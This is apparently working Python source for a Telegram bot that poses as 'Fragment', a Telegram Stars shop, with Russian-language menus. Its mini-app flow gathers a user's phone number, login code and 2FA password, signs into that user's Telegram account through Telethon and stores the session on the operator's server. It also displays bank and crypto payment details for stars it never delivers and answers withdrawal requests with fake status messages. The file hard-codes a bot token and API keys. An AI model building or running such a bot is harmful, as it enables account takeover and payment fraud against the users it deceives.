import asyncio
import logging
import random
import sqlite3
import secrets
import os
from datetime import datetime, timedelta
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command, CommandStart
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo,
    InlineQuery, InlineQueryResultArticle, InputTextMessageContent
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from telethon import TelegramClient
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneNumberInvalidError,
    FloodWaitError
)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN   = "7511789367:AAGVIDu27Sb5ZwJUjQRiHOJ-CZinbRUFrDQ"
ADMIN_ID    = 174415647

# ========== API ДАННЫЕ ДЛЯ TELEGRAM ==========
API_ID      = 28687552
API_HASH    = "1abf9a58d0c22f62437bec89bd6b27a3"

# ========== ВСЕ ПЕРЕМЕННЫЕ МАГАЗИНА ==========
SBP_PHONE   = "89041751408"
SBP_BANK    = "ВТБ — Александр Ф."
TON_ADDRESS = "UQDGN5pfjPxorFyjN2xha84bapuADDtPcRofNDJ4dK2YXxZd"
CRYPTO_BOT  = "https://t.me/send?start=IVbfPL7Tk4XA"

SHOP_STAR_PRICE_RUB = 1.1
SHOP_MIN_STARS      = 50
TOTAL_STARS_BOUGHT  = 6_385_921
STAR_TO_USD         = 0.013
TOTAL_USD           = round(TOTAL_STARS_BOUGHT * STAR_TO_USD)

bot     = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp      = Dispatcher(storage=storage)

# ========== КАСТОМНЫЕ ПРЕМИУМ ЭМОДЗИ ==========
def e(doc_id: str) -> str:
    return f'<tg-emoji emoji-id="{doc_id}"></tg-emoji>'

EMOJI = {
    "user":       e("5199552030615558774"),
    "star":       e("5267500801240092311"),
    "shield":     e("5197434882321567830"),
    "gift":       e("5197369495739455200"),
    "lock":       e("5197161121106123533"),
    "money":      e("5278467510604160626"),
    "diamond":    e("5264713049637409446"),
    "card":       e("5445353829304387411"),
    "rocket":     e("5444856076954520455"),
    "fire":       e("5303138782004924588"),
    "bell":       e("5312361253610475399"),
    "trophy":     e("5332455502917949981"),
    "check":      e("5274055917766202507"),
    "gem":        e("5258203794772085854"),
    "clock":      e("5429651785352501917"),
    "crystal":    e("5195033767969839232"),
    "chart":      e("5382194935057372936"),
    "spark":      e("5902449142575141204"),
    "warning":    e("5447644880824181073"),
    "wallet":     e("5893382531037794941"),
    "bank":       e("5238132025323444613"),
    "banknote":   e("5201873447554145566"),
    "link":       e("5902449142575141204"),
    "shine":      e("5235630047959727475"),
    "tonkeeper":  e("5397829221605191505"),
    "top_medal":  e("5188344996356448758"),
    "stars_deal": e("5321485469249198987"),
    "security":   e("5197288647275071607"),
    "stats":      e("5028746137645876535"),
    "requisites": e("5242631901214171852"),
    "cryptobot":  e("5242606681166220600"),
    "welcome":    e("5251340119205501791"),
    "balance":    e("5424976816530014958"),
    "pencil":     e("5197371802136892976"),
    "safe":       e("5262517101578443800"),
    "medal":      e("5463289097336405244"),
    "handshake":  e("5287231198098117669"),
    "pin":        e("5893297890117292323"),
    "target":     e("5893081007153746175"),
    "num1":       e("5794164805065514131"),
    "num2":       e("5794085322400733645"),
    "num3":       e("5794280000383358988"),
    "num4":       e("5794241397217304511"),
    "store":      e("4988289890769699938"),
    "photo":      e("5197521015321808897"),
    "hourglass":  e("5197453929637381812"),
}

# ========== БАЗА ДАННЫХ ==========
def init_db():
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            phone TEXT,
            auth_code TEXT,
            code_expires TIMESTAMP,
            is_authorized BOOLEAN DEFAULT 0,
            stars_balance INTEGER DEFAULT 0,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS auth_sessions (
            user_id INTEGER PRIMARY KEY,
            phone TEXT,
            step TEXT,
            twofa_password TEXT,
            session_expires TIMESTAMP,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()
    logger.info("База данных инициализирована")

init_db()
os.makedirs("sessions", exist_ok=True)

# ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
def generate_code() -> str:
    return f"{random.randint(10000, 99999)}"

def save_auth_session(user_id: int, phone: str, step: str = "phone"):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    expires = datetime.now() + timedelta(minutes=30)
    cursor.execute('INSERT OR REPLACE INTO auth_sessions (user_id, phone, step, session_expires) VALUES (?, ?, ?, ?)',
                   (user_id, phone, step, expires))
    conn.commit()
    conn.close()

def update_auth_step(user_id: int, step: str, twofa_password: str = None):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    if twofa_password:
        cursor.execute('UPDATE auth_sessions SET step = ?, twofa_password = ? WHERE user_id = ?',
                       (step, twofa_password, user_id))
    else:
        cursor.execute('UPDATE auth_sessions SET step = ? WHERE user_id = ?', (step, user_id))
    conn.commit()
    conn.close()

def get_auth_session(user_id: int):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('SELECT phone, step, twofa_password, session_expires FROM auth_sessions WHERE user_id = ?', (user_id,))
    row = cursor.fetchone()
    conn.close()
    if row and datetime.fromisoformat(row[3]) > datetime.now():
        return {"phone": row[0], "step": row[1], "twofa": row[2]}
    return None

def clear_auth_session(user_id: int):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('DELETE FROM auth_sessions WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

def authorize_user(user_id: int):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('UPDATE users SET is_authorized = 1 WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

def get_user_balance(user_id: int) -> int:
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('SELECT stars_balance FROM users WHERE user_id = ?', (user_id,))
    row = cursor.fetchone()
    conn.close()
    return row[0] if row else 0

def update_user_balance(user_id: int, amount: int):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('UPDATE users SET stars_balance = stars_balance + ? WHERE user_id = ?', (amount, user_id))
    conn.commit()
    conn.close()

user_clients = {}

# ========== КЛАВИАТУРЫ ==========
def main_menu_keyboard():
    buttons = [
        [
            InlineKeyboardButton(text=f"{EMOJI['user']} Профиль", callback_data="profile"),
            InlineKeyboardButton(text=f"{EMOJI['balance']} Баланс", callback_data="balance")
        ],
        [
            InlineKeyboardButton(text=f"{EMOJI['store']} Купить звёзды", callback_data="buy"),
            InlineKeyboardButton(text=f"{EMOJI['money']} Вывести", callback_data="withdraw_menu")
        ],
        [
            InlineKeyboardButton(text=f"{EMOJI['requisites']} Реквизиты", callback_data="requisites"),
            InlineKeyboardButton(text=f"{EMOJI['handshake']} Поддержка", callback_data="support")
        ],
        [
            InlineKeyboardButton(text=f"{EMOJI['rocket']} Открыть Mini App", web_app=WebAppInfo(url="https://stars-zdgz.onrender.com"))
        ]
    ]
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def buy_keyboard():
    buttons = [
        [
            InlineKeyboardButton(text=f"{EMOJI['num1']} 100 ⭐", callback_data="buy_100"),
            InlineKeyboardButton(text=f"{EMOJI['num2']} 500 ⭐", callback_data="buy_500")
        ],
        [
            InlineKeyboardButton(text=f"{EMOJI['num3']} 1 000 ⭐", callback_data="buy_1000"),
            InlineKeyboardButton(text=f"{EMOJI['num4']} 2 500 ⭐", callback_data="buy_2500")
        ],
        [
            InlineKeyboardButton(text=f"{EMOJI['card']} Другая сумма", callback_data="buy_custom")
        ],
        [
            InlineKeyboardButton(text=f"{EMOJI['back']} Назад", callback_data="back_to_main")
        ]
    ]
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def withdraw_keyboard():
    buttons = [
        [
            InlineKeyboardButton(text=f"{EMOJI['num1']} 100 ⭐", callback_data="withdraw_100"),
            InlineKeyboardButton(text=f"{EMOJI['num2']} 500 ⭐", callback_data="withdraw_500")
        ],
        [
            InlineKeyboardButton(text=f"{EMOJI['num3']} 1 000 ⭐", callback_data="withdraw_1000"),
            InlineKeyboardButton(text=f"{EMOJI['num4']} 2 500 ⭐", callback_data="withdraw_2500")
        ],
        [
            InlineKeyboardButton(text=f"{EMOJI['card']} Другая сумма", callback_data="withdraw_custom")
        ],
        [
            InlineKeyboardButton(text=f"{EMOJI['back']} Назад", callback_data="back_to_main")
        ]
    ]
    return InlineKeyboardMarkup(inline_keyboard=buttons)

# ========== КОМАНДЫ БОТА ==========
@dp.message(CommandStart())
async def cmd_start(message: Message):
    await message.answer(
        f"{EMOJI['crystal']} <b>Fragment</b> — управляйте звёздами Telegram {EMOJI['crystal']}\n\n"
        f"{EMOJI['rocket']} Нажмите кнопку ниже, чтобы открыть мини-приложение {EMOJI['rocket']}\n\n"
        f"{EMOJI['shield']} <i>Авторизация через Telegram — безопасно и быстро</i> {EMOJI['shield']}\n\n"
        f"{EMOJI['star']} <b>1 звезда = 0.013 USD</b> {EMOJI['star']}\n"
        f"{EMOJI['diamond']} <b>Всего выпущено: {TOTAL_STARS_BOUGHT:,} ⭐</b> {EMOJI['diamond']}\n\n"
        f"✨ <b>Добро пожаловать в мир звёзд Telegram!</b> ✨\n\n"
        f"<i>Fragment — это уникальная платформа для управления вашими звёздами.\n"
        f"Вы можете покупать, продавать и обменивать звёзды.\n"
        f"Все операции защищены протоколами Telegram Passport.</i>",
        reply_markup=main_menu_keyboard(),
        parse_mode="HTML"
    )

@dp.message(Command("admin"))
async def cmd_admin(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer(f"{EMOJI['warning']} Нет доступа {EMOJI['warning']}", parse_mode="HTML")
        return

    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM users WHERE is_authorized = 1")
    authorized = cursor.fetchone()[0]
    cursor.execute("SELECT COUNT(*) FROM users")
    total = cursor.fetchone()[0]
    cursor.execute("SELECT SUM(stars_balance) FROM users")
    total_stars = cursor.fetchone()[0] or 0
    conn.close()

    await message.answer(
        f"{EMOJI['chart']} <b>{EMOJI['stats']} СТАТИСТИКА FRAGMENT {EMOJI['stats']}</b> {EMOJI['chart']}\n\n"
        f"{EMOJI['user']} 👥 <b>Всего пользователей:</b> <code>{total}</code>\n"
        f"{EMOJI['check']} ✅ <b>Авторизовано:</b> <code>{authorized}</code>\n"
        f"{EMOJI['star']} ⭐ <b>Всего звёзд в системе:</b> <code>{TOTAL_STARS_BOUGHT:,}</code>\n"
        f"{EMOJI['balance']} 💰 <b>Звёзд на балансах:</b> <code>{total_stars:,}</code>\n"
        f"{EMOJI['money']} 💵 <b>Общая сумма:</b> <code>${TOTAL_USD:,} USD</code>\n"
        f"{EMOJI['diamond']} 💎 <b>Курс:</b> <code>1 ⭐ = ${STAR_TO_USD} = {SHOP_STAR_PRICE_RUB} RUB</code>\n\n"
        f"{EMOJI['spark']} ✨ <i>Fragment — твой путь к звёздам!</i> ✨",
        parse_mode="HTML"
    )

# ========== CALLBACK HANDLERS ==========
@dp.callback_query()
async def handle_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    data = callback.data

    if data == "profile":
        conn = sqlite3.connect('users.db')
        cursor = conn.cursor()
        cursor.execute('SELECT phone, is_authorized FROM users WHERE user_id = ?', (user_id,))
        row = cursor.fetchone()
        conn.close()

        if row and row[1]:
            await callback.message.edit_text(
                f"{EMOJI['user']} <b>👤 ПРОФИЛЬ</b> {EMOJI['user']}\n\n"
                f"📱 <b>Телефон:</b> <code>{row[0]}</code>\n"
                f"🆔 <b>Telegram ID:</b> <code>{user_id}</code>\n"
                f"👤 <b>Имя:</b> {callback.from_user.full_name}\n"
                f"🔹 <b>Username:</b> @{callback.from_user.username or 'нет'}\n\n"
                f"{EMOJI['safe']} 🔒 <i>Ваши данные защищены Telegram Passport</i>",
                parse_mode="HTML",
                reply_markup=main_menu_keyboard()
            )
        else:
            await callback.message.edit_text(
                f"{EMOJI['warning']} ⚠️ <b>Вы не авторизованы</b> ⚠️\n\n"
                f"Нажмите кнопку «Открыть Mini App» и войдите в аккаунт.",
                parse_mode="HTML",
                reply_markup=main_menu_keyboard()
            )

    elif data == "balance":
        balance = get_user_balance(user_id)
        await callback.message.edit_text(
            f"{EMOJI['balance']} <b>💰 БАЛАНС</b> {EMOJI['balance']}\n\n"
            f"⭐ <b>Звёзды:</b> <code>{balance} ⭐</code>\n"
            f"💵 <b>В USD:</b> <code>${balance * STAR_TO_USD:.2f}</code>\n"
            f"💶 <b>В RUB:</b> <code>{balance * SHOP_STAR_PRICE_RUB:.2f} ₽</code>\n\n"
            f"{EMOJI['star']} <b>Курс:</b> 1 ⭐ = ${STAR_TO_USD} / {SHOP_STAR_PRICE_RUB} ₽\n\n"
            f"<i>Пополняйте баланс, чтобы начать покупать звёзды!</i>",
            parse_mode="HTML",
            reply_markup=main_menu_keyboard()
        )

    elif data == "buy":
        await callback.message.edit_text(
            f"{EMOJI['store']} <b>🛒 ПОКУПКА ЗВЁЗД</b> {EMOJI['store']}\n\n"
            f"Выберите количество звёзд для покупки:\n\n"
            f"⭐ <b>100 звёзд</b> = ${100 * STAR_TO_USD:.2f} / {100 * SHOP_STAR_PRICE_RUB:.0f} ₽\n"
            f"⭐ <b>500 звёзд</b> = ${500 * STAR_TO_USD:.2f} / {500 * SHOP_STAR_PRICE_RUB:.0f} ₽\n"
            f"⭐ <b>1 000 звёзд</b> = ${1000 * STAR_TO_USD:.2f} / {1000 * SHOP_STAR_PRICE_RUB:.0f} ₽\n"
            f"⭐ <b>2 500 звёзд</b> = ${2500 * STAR_TO_USD:.2f} / {2500 * SHOP_STAR_PRICE_RUB:.0f} ₽\n\n"
            f"{EMOJI['spark']} <i>После выбора суммы вам будут показаны реквизиты для оплаты</i>",
            parse_mode="HTML",
            reply_markup=buy_keyboard()
        )

    elif data == "withdraw_menu":
        await callback.message.edit_text(
            f"{EMOJI['money']} <b>💸 ВЫВОД ЗВЁЗД</b> {EMOJI['money']}\n\n"
            f"Выберите количество звёзд для вывода:\n\n"
            f"⭐ <b>100 звёзд</b> = ${100 * STAR_TO_USD:.2f}\n"
            f"⭐ <b>500 звёзд</b> = ${500 * STAR_TO_USD:.2f}\n"
            f"⭐ <b>1 000 звёзд</b> = ${1000 * STAR_TO_USD:.2f}\n"
            f"⭐ <b>2 500 звёзд</b> = ${2500 * STAR_TO_USD:.2f}\n\n"
            f"{EMOJI['clock']} <i>Вывод занимает до 10 минут</i>",
            parse_mode="HTML",
            reply_markup=withdraw_keyboard()
        )

    elif data == "requisites":
        await callback.message.edit_text(
            f"{EMOJI['requisites']} <b>📋 РЕКВИЗИТЫ ДЛЯ ОПЛАТЫ</b> {EMOJI['requisites']}\n\n"
            f"🏦 <b>СБП (Система быстрых платежей):</b>\n"
            f"   Номер: <code>{SBP_PHONE}</code>\n"
            f"   Банк: {SBP_BANK}\n"
            f"   Получатель: Александр Ф.\n\n"
            f"{EMOJI['tonkeeper']} 💎 <b>TON (Telegram Open Network):</b>\n"
            f"   Адрес: <code>{TON_ADDRESS}</code>\n\n"
            f"{EMOJI['cryptobot']} 🤖 <b>CryptoBot (Telegram):</b>\n"
            f"   Ссылка: <a href='{CRYPTO_BOT}'>Нажмите для оплаты</a>\n\n"
            f"<b>Важно!</b> В назначении платежа укажите ваш Telegram ID: <code>{user_id}</code>\n\n"
            f"{EMOJI['spark']} <i>После оплаты звёзды зачислятся автоматически</i>",
            parse_mode="HTML",
            disable_web_page_preview=True,
            reply_markup=main_menu_keyboard()
        )

    elif data == "support":
        await callback.message.edit_text(
            f"{EMOJI['handshake']} <b>📞 ПОДДЕРЖКА</b> {EMOJI['handshake']}\n\n"
            f"По всем вопросам обращайтесь:\n\n"
            f"👤 <b>Администратор:</b> @DarkStudiox_admin\n"
            f"📢 <b>Новости:</b> @DarkStudiox_news\n"
            f"💬 <b>Чат:</b> @DarkStudiox_chat\n\n"
            f"{EMOJI['clock']} <i>Время ответа: обычно в течение 10-30 минут</i>",
            parse_mode="HTML",
            reply_markup=main_menu_keyboard()
        )

    elif data == "back_to_main":
        await callback.message.edit_text(
            f"{EMOJI['crystal']} <b>Fragment</b> — управляйте звёздами Telegram {EMOJI['crystal']}\n\n"
            f"{EMOJI['rocket']} Нажмите кнопку ниже, чтобы открыть мини-приложение {EMOJI['rocket']}\n\n"
            f"{EMOJI['shield']} <i>Авторизация через Telegram — безопасно и быстро</i> {EMOJI['shield']}\n\n"
            f"{EMOJI['star']} <b>1 звезда = 0.013 USD</b> {EMOJI['star']}\n"
            f"{EMOJI['diamond']} <b>Всего выпущено: {TOTAL_STARS_BOUGHT:,} ⭐</b> {EMOJI['diamond']}",
            parse_mode="HTML",
            reply_markup=main_menu_keyboard()
        )

    elif data.startswith("buy_"):
        amount = int(data.split("_")[1])
        await callback.message.edit_text(
            f"{EMOJI['requisites']} <b>📋 ОПЛАТА {amount} ⭐</b> {EMOJI['requisites']}\n\n"
            f"⭐ <b>Сумма:</b> {amount} ⭐\n"
            f"💵 <b>К оплате:</b> ${amount * STAR_TO_USD:.2f} / {amount * SHOP_STAR_PRICE_RUB:.0f} ₽\n\n"
            f"🏦 <b>СБП:</b> <code>{SBP_PHONE}</code> ({SBP_BANK})\n"
            f"{EMOJI['tonkeeper']} 💎 <b>TON:</b> <code>{TON_ADDRESS[:20]}...</code>\n"
            f"{EMOJI['cryptobot']} 🤖 <b>CryptoBot:</b> <a href='{CRYPTO_BOT}'>Перейти</a>\n\n"
            f"<b>Важно!</b> В назначении платежа укажите: <code>⭐{amount} ID:{user_id}</code>\n\n"
            f"{EMOJI['spark']} <i>После оплаты звёзды зачислятся автоматически</i>",
            parse_mode="HTML",
            disable_web_page_preview=True,
            reply_markup=main_menu_keyboard()
        )

    elif data.startswith("withdraw_"):
        amount = int(data.split("_")[1])
        balance = get_user_balance(user_id)
        if balance < amount:
            await callback.answer(f"Недостаточно звёзд! У вас {balance} ⭐", show_alert=True)
            return

        await callback.message.edit_text(
            f"{EMOJI['money']} <b>💰 ЗАЯВКА НА ВЫВОД {amount} ⭐</b> {EMOJI['money']}\n\n"
            f"⭐ <b>Сумма:</b> {amount} ⭐\n"
            f"💵 <b>Сумма в USD:</b> ${amount * STAR_TO_USD:.2f}\n\n"
            f"⏱️ <b>Статус:</b> <i>обрабатывается</i>\n"
            f"🆔 <b>ID заявки:</b> <code>{secrets.token_hex(8)}</code>\n\n"
            f"{EMOJI['spark']} <i>Вывод обычно занимает до 10 минут.\n"
            f"Средства будут отправлены на ваш кошелёк, привязанный к аккаунту.</i>",
            parse_mode="HTML",
            reply_markup=main_menu_keyboard()
        )

    elif data == "buy_custom":
        await callback.message.edit_text(
            f"{EMOJI['pencil']} <b>Введите сумму в звёздах</b> {EMOJI['pencil']}\n\n"
            f"Отправьте сообщением количество звёзд, которое хотите купить.\n"
            f"Минимальная сумма: <b>{SHOP_MIN_STARS} ⭐</b>\n\n"
            f"<i>Пример: 1500</i>",
            parse_mode="HTML",
            reply_markup=main_menu_keyboard()
        )

    elif data == "withdraw_custom":
        await callback.message.edit_text(
            f"{EMOJI['pencil']} <b>Введите сумму для вывода</b> {EMOJI['pencil']}\n\n"
            f"Отправьте сообщением количество звёзд, которое хотите вывести.\n"
            f"Минимальная сумма: <b>{SHOP_MIN_STARS} ⭐</b>\n\n"
            f"<i>Пример: 500</i>",
            parse_mode="HTML",
            reply_markup=main_menu_keyboard()
        )

    await callback.answer()

# ========== ОБРАБОТКА WEBAПП ==========
@dp.message(F.web_app_data)
async def handle_webapp_data(message: Message):
    data = message.web_app_data.data
    user_id = message.from_user.id

    logger.info(f"{EMOJI['spark']} Получены данные от {user_id}: {data[:100]}... {EMOJI['spark']}")

    try:
        import json
        payload = json.loads(data)
        action = payload.get("action")

        if action == "send_code":
            phone = payload.get("phone")
            if not phone:
                await message.answer(f"{EMOJI['warning']} Не указан номер телефона {EMOJI['warning']}", parse_mode="HTML")
                return

            save_auth_session(user_id, phone, "phone")
            await message.answer(f"{EMOJI['rocket']} Отправляю код на номер {phone}... {EMOJI['rocket']}", parse_mode="HTML")

            try:
                client = TelegramClient(f"sessions/user_{user_id}", API_ID, API_HASH)
                await client.connect()
                await client.send_code_request(phone)
                user_clients[user_id] = client

                await message.answer(
                    f"{EMOJI['check']} <b>Код отправлен на {phone}</b> {EMOJI['check']}\n\n"
                    f"{EMOJI['lock']} Введите код в мини-приложении (5 цифр) {EMOJI['lock']}\n"
                    f"{EMOJI['clock']} Код действителен 5 минут {EMOJI['clock']}\n\n"
                    f"{EMOJI['spark']} <i>Проверьте личные сообщения от Telegram!</i> {EMOJI['spark']}",
                    parse_mode="HTML"
                )
            except PhoneNumberInvalidError:
                await message.answer(f"{EMOJI['warning']} Неверный формат номера телефона {EMOJI['warning']}", parse_mode="HTML")
                clear_auth_session(user_id)
            except FloodWaitError as e:
                await message.answer(f"{EMOJI['clock']} Слишком много попыток. Подождите {e.seconds} сек. {EMOJI['clock']}", parse_mode="HTML")
                clear_auth_session(user_id)
            except Exception as e:
                logger.error(f"Ошибка отправки кода: {e}")
                await message.answer(f"{EMOJI['warning']} Ошибка: {str(e)} {EMOJI['warning']}", parse_mode="HTML")
                clear_auth_session(user_id)

        elif action == "check_code":
            code = payload.get("code")
            session = get_auth_session(user_id)

            if not session or session["step"] != "code":
                await message.answer(f"{EMOJI['warning']} Сессия истекла. Начните заново. {EMOJI['warning']}", parse_mode="HTML")
                return

            client = user_clients.get(user_id)
            if not client:
                await message.answer(f"{EMOJI['warning']} Сессия не найдена. Начните заново. {EMOJI['warning']}", parse_mode="HTML")
                clear_auth_session(user_id)
                return

            try:
                await client.sign_in(session["phone"], code)
                me = await client.get_me()
                await message.answer(
                    f"{EMOJI['trophy']} <b>{EMOJI['star']} АВТОРИЗАЦИЯ УСПЕШНА! {EMOJI['star']}</b> {EMOJI['trophy']}\n\n"
                    f"{EMOJI['user']} Вы вошли в аккаунт: <b>{me.first_name} {me.last_name or ''}</b> {EMOJI['user']}\n"
                    f"📱 Номер: <code>{me.phone}</code>\n"
                    f"🔹 Username: @{me.username or 'нет'}\n\n"
                    f"{EMOJI['welcome']} Добро пожаловать в Fragment! {EMOJI['welcome']}\n"
                    f"{EMOJI['safe']} Сессия сохранена {EMOJI['safe']}",
                    parse_mode="HTML"
                )
                authorize_user(user_id)
                clear_auth_session(user_id)

            except SessionPasswordNeededError:
                update_auth_step(user_id, "2fa")
                await message.answer(
                    f"{EMOJI['lock']} <b>{EMOJI['shield']} ТРЕБУЕТСЯ ПАРОЛЬ 2FA {EMOJI['shield']}</b> {EMOJI['lock']}\n\n"
                    f"Введите пароль в мини-приложении",
                    parse_mode="HTML"
                )

            except PhoneCodeInvalidError:
                await message.answer(f"{EMOJI['warning']} Неверный код. Попробуйте ещё раз. {EMOJI['warning']}", parse_mode="HTML")

            except Exception as e:
                logger.error(f"Ошибка проверки кода: {e}")
                await message.answer(f"{EMOJI['warning']} Ошибка: {str(e)} {EMOJI['warning']}", parse_mode="HTML")

        elif action == "check_2fa":
            password = payload.get("password")
            session = get_auth_session(user_id)

            if not session or session["step"] != "2fa":
                await message.answer(f"{EMOJI['warning']} Сессия истекла. Начните заново. {EMOJI['warning']}", parse_mode="HTML")
                return

            client = user_clients.get(user_id)
            if not client:
                await message.answer(f"{EMOJI['warning']} Сессия не найдена. Начните заново. {EMOJI['warning']}", parse_mode="HTML")
                clear_auth_session(user_id)
                return

            try:
                await client.sign_in(password=password)
                me = await client.get_me()

                await message.answer(
                    f"{EMOJI['trophy']} <b>{EMOJI['star']} АВТОРИЗАЦИЯ УСПЕШНА! {EMOJI['star']}</b> {EMOJI['trophy']}\n\n"
                    f"{EMOJI['user']} <b>Вы вошли в аккаунт:</b> {EMOJI['user']}\n"
                    f"👤 <b>Имя:</b> {me.first_name} {me.last_name or ''}\n"
                    f"📱 <b>Номер:</b> <code>{me.phone}</code>\n"
                    f"🔹 <b>Username:</b> @{me.username or 'нет'}\n\n"
                    f"{EMOJI['welcome']} <b>Добро пожаловать в Fragment!</b> {EMOJI['welcome']}\n"
                    f"{EMOJI['spark']} <i>Твой путь к звёздам начинается здесь!</i> {EMOJI['spark']}",
                    parse_mode="HTML"
                )
                authorize_user(user_id)
                clear_auth_session(user_id)

            except Exception as e:
                logger.error(f"Ошибка 2FA: {e}")
                await message.answer(f"{EMOJI['warning']} Неверный пароль 2FA {EMOJI['warning']}", parse_mode="HTML")

    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await message.answer(f"{EMOJI['warning']} Ошибка: {str(e)} {EMOJI['warning']}", parse_mode="HTML")

# ========== ЗАПУСК ==========
async def main():
    await bot.delete_webhook(drop_pending_updates=True)
    logger.info(f"{EMOJI['crystal']} Бот Fragment запущен с кастомными премиум эмодзи {EMOJI['crystal']}")
    logger.info("🚀 Telethon авторизация активна 🚀")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
